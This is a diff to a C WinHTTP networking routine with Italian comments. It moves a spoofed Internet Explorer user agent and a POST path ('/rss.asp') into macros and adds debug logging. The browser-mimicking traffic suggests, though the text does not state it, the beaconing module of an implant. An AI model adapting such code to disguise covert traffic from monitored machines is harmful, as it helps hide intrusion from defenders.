@@ -3,6 +3,9 @@
 #include <stdio.h>
 #include "win_http.h"
 
+#undef _GLOBAL_VERSION_FUNCTIONS_
+#include "version.h"
+
 HINTERNET hGlobalInternet = 0;
 HINTERNET hSession = 0;
 HINTERNET hConnect = 0;
@@ -115,9 +118,8 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 	// Crea una sessione per winhttp.
 	//hSession = WinHttpOpen(L"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
 	//hSession = WinHttpOpen(L"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
-	hSession = WinHttpOpen(L"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
-
-	
+	//hSession = WinHttpOpen(L"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
+	hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
 
 	// Cerca nel registry le configurazioni del proxy
 	if (hSession && WinHttpGetIEProxyConfigForCurrentUser(&pProxyConfig)) 
@@ -209,7 +211,8 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 	if (!(hConnect = WinHttpConnect(hSession, (LPCWSTR)_wHost, INTERNET_DEFAULT_HTTP_PORT, 0)))
 		return FALSE;
 
-	if (!(hGlobalInternet = WinHttpOpenRequest(hConnect, L"POST", L"/rss.asp", NULL, WINHTTP_NO_REFERER, (LPCWSTR *) wTypes, 0)))
+	if (!(hGlobalInternet = WinHttpOpenRequest(hConnect, L"POST", POST_PAGE, NULL, WINHTTP_NO_REFERER, (LPCWSTR *) wTypes, 0)))
+	  
 	{
 #ifdef _DEBUG
 		OutputDebugString(L"[!!] WinHttpOpenRequest FAILED\n");
@@ -218,8 +221,24 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 		return FALSE;
 	}
 
-	WinHttpSetTimeouts(hGlobalInternet, RESOLVE_TIMEOUT, CONNECT_TIMEOUT, SEND_TIMEOUT, RECV_TIMEOUT);
-	return TRUE;
+#ifdef _DEBUG
+		OutputDebugString(L"[!!] WinHttpOpenRequest SUCCEEDED\n");
+#endif
+
+	if(!WinHttpSetTimeouts(hGlobalInternet, RESOLVE_TIMEOUT, CONNECT_TIMEOUT, SEND_TIMEOUT, RECV_TIMEOUT) == TRUE)
+	{
+		#ifdef _DEBUG
+			OutputDebugString(L"[!!] WinHttpSetTimeouts FAILED\n");
+		#endif
+	}
+	else
+	{
+		#ifdef _DEBUG
+				OutputDebugString(L"[!!] WinHttpSetTimeouts SUCCEEDED\n");
+		#endif
+	}
+
+	return TRUE;	
 }
 
 
